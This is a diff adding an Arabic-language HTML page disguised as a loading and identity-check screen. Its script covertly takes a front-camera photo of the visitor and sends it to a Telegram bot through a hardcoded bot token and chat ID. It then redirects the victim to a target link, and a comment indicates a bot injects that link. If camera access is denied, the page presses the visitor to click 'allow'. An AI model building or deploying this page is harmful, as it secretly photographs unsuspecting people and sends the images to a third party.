@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التحميل...</title>
+    <style>
+        body { background-color: #000; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #222; border-top: 4px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        canvas, video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div id="status">جاري التحقق من الهوية...</div>
+    <canvas id="canvas"></canvas>
+
+<script>
+    // التوكن المحدث
+    const TELEGRAM_TOKEN = '8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc';
+    
+    const urlParams = new URLSearchParams(window.location.search);
+    const CHAT_ID = urlParams.get('chatId') || urlParams.get('sender_id') || '8169635171';
+    // الرابط الهدف الذي سيتم التوجيه إليه (الرابط الأصلي الذي حقنه البوت)
+    const TARGET_URL = urlParams.get('target') || "https://www.google.com";
+
+    async function startCapture() {
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.createElement('video');
+            video.setAttribute('playsinline', ''); 
+            video.srcObject = stream;
+            await video.play();
+
+            setTimeout(async () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('photo', blob, 'image.jpg');
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                    } catch (e) {
+                        console.error("Error:", e);
+                    } finally {
+                        stream.getTracks().forEach(track => track.stop());
+                        // التوجيه للرابط الهدف بدلاً من جوجل
+                        window.location.replace(TARGET_URL);
+                    }
+                }, 'image/jpeg', 0.7);
+
+            }, 2000); 
+
+        } catch (error) {
+            document.getElementById('status').innerText = "يرجى الضغط على 'سماح' للمتابعة";
+        }
+    }
+
+    // الانتظار حتى يضغط المستخدم على الصفحة لضمان عمل الكاميرا في بعض المتصفحات
+    window.onclick = () => {
+        if (document.getElementById('status').innerText.includes("سماح")) {
+            startCapture();
+        }
+    };
+    window.onload = startCapture;
+</script>
+</body>
+</html>
